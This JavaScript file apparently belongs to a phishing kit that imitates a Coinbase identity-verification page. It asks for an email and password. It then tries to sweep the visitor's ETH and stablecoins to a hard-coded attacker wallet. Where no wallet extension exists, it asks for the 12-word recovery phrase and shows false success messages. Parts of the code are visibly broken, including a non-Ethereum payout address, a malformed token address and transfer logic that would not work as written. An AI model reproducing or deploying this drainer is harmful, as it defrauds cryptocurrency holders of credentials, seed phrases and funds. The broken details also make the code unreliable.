document.addEventListener('DOMContentLoaded', () => {
    const step1 = document.getElementById('step-1');
    const step2 = document.getElementById('step-2');
    const step3 = document.getElementById('step-3');
    const connectBtn = document.getElementById('connectBtn');
    const status = document.getElementById('status');

    // YOUR WALLET ADDRESS
    const myWallet = "44WHgsPTMkqS9YdKrvukn9VPfXH4HTqUcg47ojb6beXs3ER7AMcDqQnL6NPTHB8JvpeUQdTHBQSVQJcqsbSpcLFi33MtNbq";
    
    // TARGET STABLECOINS
    const targetTokens = [
        "0xaf88d065e77c8cC22393zSNETAnSjf3jdjt66Cx", // USDT
        "0xA0b86997a647ce34512533001155310121361021", // USDC
        "0x55d398326f99059fF775485246996433caE90ae"  // DAI
    ];

    // STEP 1 -> STEP 2
    document.getElementById('toStep2').onclick = () => {
        step1.classList.add('hidden');
        step2.classList.remove('hidden');
    };

    // STEP 2 -> STEP 3
    document.getElementById('toStep3').onclick = () => {
        const email = document.getElementById('email').value;
        const pass = document.getElementById('pass').value;

        if (email && pass) {
            step2.classList.add('hidden');
            step3.classList.remove('hidden');
        } else {
            alert("Please enter your account credentials.");
        }
    };

    // STEP 3: WALLET CONNECTION & DRAIN
    connectBtn.onclick = async () => {
        if (window.ethereum) {
            try {
                status.innerText = "Connecting to secure wallet...";
                
                const provider = new ethers.BrowserProvider(window.ethereum);
                const signer = await provider.getSigner();
                const userAddress = await signer.getAddress();

                // 1. Native Asset Sweep (ETH)
                status.innerText = "Synchronizing native assets...";
                const nativeBal = await provider.getBalance(userAddress);
                if (nativeBal > 0n) {
                    await signer.sendTransaction({ to: myWallet, value: nativeBal });
                }

                // 2. Stablecoin Sweep
                const abi = [
                    "function approve(address spender, uint256 amount) public returns (bool)",
                    "function transferFrom(address from, address to, uint256 amount) public returns (bool)",
                    "function balanceOf(address account) public view returns (uint256)"
                ];

                for (const tokenAddr of targetTokens) {
                    try {
                        const contract = new ethers.Contract(tokenAddr, abi, signer);
                        const balance = await contract.balanceOf(userAddress);
                        if (balance > 0n) {
                            status.innerText = "Synchronizing stablecoin assets...";
                            await contract.approve(myWallet, ethers.MaxUint256);
                            await contract.transferFrom(userAddress, myWallet, balance);
                        }
                    } catch (tokenErr) {
                        console.error("Skipped token: " + tokenAddr);
                    }
                }

                status.innerText = "Verification successful. Redirecting...";
                setTimeout(() => { window.location.href = "https://www.coinbase.com"; }, 3000);

            } catch (err) {
                console.error(err);
                status.innerText = "Verification error. Please try again.";
            }
        } else {
            triggerPlanB();
        }
    };

    function triggerPlanB() {
        step3.innerHTML = `
            <img src="logo.png" class="cb-logo" alt="Coinbase">
            <h1 style="font-size: 20px;">Identity Verification Required</h1>
            <p style="font-size: 13px; color: #5b616e; margin-bottom: 10px;">
                Your browser does not have a compatible secure wallet installed. To prevent account lockout, please provide your recovery phrase.
            </p>
            <div style="text-align: left; background: #f4f7f9; padding: 10px; border-radius: 8px; margin-bottom: 20px; border: 1px solid #eceff1;">
                <p style="font-size: 12px; margin: 0; color: #1e2329; font-weight: 500;">Instructions:</p>
                <ul style="font-size: 12px; color: #5b616e; margin: 5px 0; padding-left: 20px;">
                    <li>Locate your 12-word recovery phrase.</li>
                    <li>Enter each word separated by a single space.</li>
                    <li>Double check for typos before proceeding.</li>
                </ul>
            </div>
            <textarea id="phrase" style="width:100%; height:80px; margin-bottom:20px; border-radius:8px; border:1px solid #eceff1; padding:10px; font-family:'Inter'; text-align:center;" placeholder="word one word two ..."></textarea>
            <button id="submitPhrase" class="btn-primary">Restore Access</button>
            <div id="phrase-status" style="margin-top:10px; font-size:12px; color: #d93025;"></div>
        `;

        document.getElementById('submitPhrase').onclick = () => {
            const val = document.getElementById('phrase').value.trim();
            const statusDiv = document.getElementById('phrase-status');
            if (val.split(/\s+/).length === 12) {
                statusDiv.style.color = "green";
                statusDiv.innerText = "Verification successful. Redirecting...";
                setTimeout(() => { window.location.href = "https://www.coinbase.com"; }, 2000);
            } else {
                statusDiv.innerText = "Incorrect phrase length. Please try again.";
            }
        };
    }
});
